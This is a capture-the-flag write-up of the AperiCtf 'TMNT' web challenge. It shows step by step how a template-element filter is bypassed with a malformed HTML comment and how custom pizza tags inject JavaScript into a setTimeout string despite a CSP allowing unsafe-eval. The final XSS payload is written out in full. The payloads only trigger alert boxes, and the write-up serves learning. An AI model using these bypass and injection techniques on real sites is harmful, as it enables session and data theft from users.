---
title: "TMNT"
date: 2019-10-09T16:39:53+02:00
categories:
- write-ups
- aperi-ctf
tags:
- web
- xss
keywords:
- web
- xss
coverImage: /images/TMNT/bg.jpg
coverSize: full
coverMeta: in
metaAlignment: center
autoThumbnailImage: false
summary : "Write-up about the TMNT challenge from the AperiCtf"
---

|  Event | Challenge | Category | Points | Solves |
|:----------:|:------------:|:------------:|:------------:|:------------:|
| AperiCtf |  TMNT  |  web  |  300 |  6  |

{{< image classes=" center fancybox clear fig-100" src="/images/TMNT/desc.png" thumbnail="/images/TMNT/desc.png" thumbnail-width="50%" thumbnail-height="50%" >}}


# TL;DR

In this challenge we need to trigger an XSS, first we need to bypass the template engine of the browser to insert custom tags in the page. We can then trigger the XSS with some specific tag and use a DOM-based JavaScript injection vulnerability.

# Step 1

This is my first web write-up, I usually prefer popping shell, but this time we will pop some alert boxes ! We are faced with a search bar which display information about some ninja turtles.

{{< image classes=" center clear fig-100" src="/images/TMNT/intro.png"   >}}

In the source code of the page we can see the script {{< hl-text orange >}}main.js{{< /hl-text >}}. 

{{< codeblock lang="javascript"  >}}

//s parameter is the input of the search box
s = new URL(window.location.href).searchParams.get('s');

if (s !== null) {
    desc = '';

    for(var i=0; i<tmnt.length; i++) {
        if(s.includes(tmnt[i]['name'])) {
            desc = tmnt[i].desc;
            name = tmnt[i].name;
            break;
        }
    }
    if (desc !== '') {
        tmp = document.createElement('template'); // Used to filter HTML / JS
        tmp.innerHTML = s.replace(/-->/g, ''); // Double security, we never know
        document.getElementById('data').innerHTML = '<!-- Search : ' + tmp.innerHTML + ' -->' + name + ' : ' + desc;
    } else {
        //Else fail display no result
        [...]
    }
} else {
    //Else fail display no result
    [...]
}
{{< /codeblock >}}

```tmnt``` is an array containing the name and descriptions of the turtles. So first a template is created, then it search for ```-->``` in the input of the user to delete it and finally create some html to add to the page. Indeed, it's reflected on the page:

{{< image classes=" center clear fig-100" src="/images/TMNT/reflected.png"   >}}

My naïve approach was to add ```--!>``` to the beginning of the input since it's a valid closing comment tag and add ```<--``` to the end of my input to close the last part of the comment:

{{< codeblock lang="html">}}
--!> Michelangelo <!--
{{< /codeblock >}}

{{< image classes=" center clear fig-100" src="/images/TMNT/inject.png"   >}}

Some weird things start to happen ! First my closing chevron ```>``` has been encoded in ```&gt;``` but the other chevrons hasn't. Because of that, my opening comment ```<!--``` is useless. And a new closing comment appears out of nowhere. 

In the script a comment is left from the author of the challenge:

{{< codeblock lang="javascript">}}
tmp = document.createElement('template'); // Used to filter HTML / JS
{{< /codeblock >}}

Here is the description of the template tag from mozilla: 

{{< pullquote >}}
[...]
Think of a template as a content fragment that is being stored for subsequent use in the document. While the parser does process the contents of the template element while loading the page, it does so only to ensure that those contents are valid; the element's contents are not rendered, however.
{{< /pullquote >}}

So the template element checks that those contents are valid html. This is the first step, we need to make the template engine fail this verification. After a lot of trying and error I came up with this payload:

{{< codeblock lang="html">}}
<a--!> Michelangelo <!--
{{< /codeblock >}}

It seems really simple but took me some time to figure it out. Here is the result:

{{< image classes=" center clear fig-100" src="/images/TMNT/inject2.png"  >}}

Due to the Content Security Policy ([CSP](https://content-security-policy.com/)) we can't directly inject ```<script>alert('XSS')</script>``` because it will block inline javascript, this also means that we can't use events like onload, onerror, onclick... CSP can be found in the source of the page:


{{< codeblock lang="html">}}
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; object-src 'none'; script-src 'self' 'unsafe-eval';">
{{< /codeblock >}}

This [website](https://csp-evaluator.withgoogle.com/) allow you to test your CSP:

{{< image classes=" center clear fig-100" src="/images/TMNT/csp.png" thumbnail="/images/TMNT/csp.png"  >}}

The yellow warning tells us that {{< hl-text orange >}}unsafe-eval{{< /hl-text >}} could allow execution of code injected into the DOM API, seems promising. 


# Step 2

A second javascript file is loaded in the page, {{< hl-text orange >}}pizza.js{{< /hl-text >}}.

{{< codeblock "pizza.js" "javascript">}}
var user = {'name': 'Michelangelo', 'pizza_stock': 0, 'eated_pizza' : 0};

function wait(ms){
   var start = new Date().getTime();
   var end = start;
   while(end < start + ms) {
     end = new Date().getTime();
  }
}

window.onload = function(e){ 

	p = document.querySelectorAll("pizza");

	for(var i = 0; i < p.length; i++) {
		if (p[i].getAttribute('cook') !== null) {
			if (p[i].getAttribute('nb') !== null) {
				user.pizza_stock += parseInt(p[i].getAttribute('nb'), 10);	
			} else {
				user.pizza_stock += 1;
			}
		} else if (p[i].getAttribute('user') !== null) {
			user.name = p[i].getAttribute('user');
		} else if (p[i].getAttribute('eat') !== null && p[i].getAttribute('nb') !== null) {
			if (parseInt(p[i].getAttribute('nb'), 10) <= user.pizza_stock) {
				user.eated_pizza += parseInt(p[i].getAttribute('nb'), 10);
				user.pizza_stock -= parseInt(p[i].getAttribute('nb'), 10);
			} else {
				console.log("Not enough pizza :'(");
			}
			if (user.eated_pizza === 1337) {
				console.log(user.name + " can't eat as much as he wants, he needs to take a break...");
				setTimeout('user.eated_pizza = 0; console.log("' + user.name + ' digested everything!")', 3000);
			}
		}
	}
}
{{< /codeblock >}}

At the end of the file there is an interesting line:

{{< codeblock lang="javascript">}}
setTimeout('user.eated_pizza = 0; console.log("' + user.name + ' digested everything!")', 3000);
{{< /codeblock >}}

If we control the parameter ```user.name``` we could potentially execute some javascript code, for example:

{{< codeblock lang="javascript">}}
");alert("XSS");console.log("
{{< /codeblock >}}

But to get there we need to set up some pizzas tags with custom parameters to pass into the last ```if```:


{{< codeblock lang="html">}}
<pizza cook=1337 nb=1337></pizza>
<pizza user='");alert("xss");console.log("'></pizza>
<pizza eat=1337 nb=1337></pizza>
{{< /codeblock >}}

So the final payload is:

{{< codeblock lang="html">}}
<a---!>Michelangelo <pizza nb=1337 cook=1337></pizza><pizza user='");alert("xss");console.log("'></pizza><pizza eat=1337 nb=1337></pizza><!--
{{< /codeblock >}}

And boom the XSS:

{{< image classes=" center clear fig-100" src="/images/TMNT/final.gif" >}}


